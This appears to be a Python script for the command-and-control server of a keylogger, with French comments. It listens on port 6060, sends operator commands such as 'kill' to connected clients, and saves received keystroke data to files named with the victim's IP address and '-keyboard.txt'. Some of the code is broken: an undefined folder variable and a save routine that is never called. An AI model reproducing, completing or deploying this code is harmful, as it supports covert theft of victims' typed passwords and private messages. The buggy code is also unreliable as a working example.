from threading import Thread
import socket
import sys
import os
import time
from datetime import datetime

fin = True

def receive(client):
    
    requete = client.recv(500)
    requete = requete.decode('utf-8')
    print(requete)
    if not requete :
        print('close')
        

def receive_file(filename, client_socket, destination_folder):
    full_path = os.path.join(destination_folder, filename)
    with open(full_path, 'wb') as file:
        while True:
            keylog = client_socket.recv(4096)
            if not keylog  :
                break
            file.write(keylog)


def send(client):
    global fin
    while fin:
        msg = input('->')
        if msg == "kill":
            fin = False
        client.sendall(bytes(msg,"utf-8"))
    return fin
        

class threadforclient(Thread):
    def __init__(self,client):
        Thread.__init__(self)
        self.client = client
    
    def run(self):
        envoie = Thread(target=send,args=[self.client])
        recu = Thread(target=receive,args=[self.client])
        envoie.start()

        recu.start()

        
        """requete = self.client.recv(1024)
        print(requete.decode('utf-8'))
        if not requete :
            print('close')"""
        

#----------------------------------------------------------


def conexion(clientSocket):
        # IP du client
    client_ip = clientSocket[0]

    # Heure actuelle
    heure_actuelle = datetime.now()
    # Formatage de l'heure actuelle
    heure_formattee = heure_actuelle.strftime("%Y-%m-%d_%H-%M-%S")
    # Remplacement des caractères non valides dans le nom du fichier
    heure_formattee = heure_formattee.replace(":", "-").replace(" ", "/")

    print("Nouvelle connexion entrante:", clientSocket)
    # Réception du fichier envoyé par le client
    filename = f"{client_ip}-{heure_formattee}-keyboard.txt"
    receive_file(filename, clientSocket, save_folder)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setblocking(False)
s.bind((socket.gethostname(),6060))
print('le serveur est allumer')

while fin == True:

    s.listen(5)
    try:
        clientSocket,address = s.accept()
        print("connection est etablie from address" , address)
        my_thread = Thread(target=send,args=[clientSocket])
        my_thread.start()
        my_thread.join()
    except BlockingIOError:
        pass

    if fin == False:
        time.sleep(3)
        sys.exit()



clientSocket.close()
s.close()
